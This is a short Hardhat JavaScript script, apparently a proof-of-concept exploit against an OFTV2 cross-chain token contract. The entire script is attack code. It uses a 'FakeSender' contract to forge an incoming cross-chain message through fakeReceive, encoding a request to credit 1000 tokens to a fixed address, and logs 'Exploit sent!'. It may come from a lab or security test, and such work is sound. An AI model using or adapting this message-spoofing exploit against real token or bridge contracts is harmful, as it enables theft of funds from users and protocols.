const { ethers } = require("hardhat");

async function main() {
    const oft = await ethers.getContract("OFTV2");
    const fakeSender = await ethers.getContract("FakeSender");

    const payload = ethers.utils.defaultAbiCoder.encode(
        ["uint256", "bytes", "address"],
        [ethers.utils.parseEther("1000"), "0x", "0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65"]
    );

    const tx = await fakeSender.fakeReceive(oft.address, payload);
    await tx.wait();
    console.log(" Exploit sent! Requested transfer of 1000 tokens");
}

main();
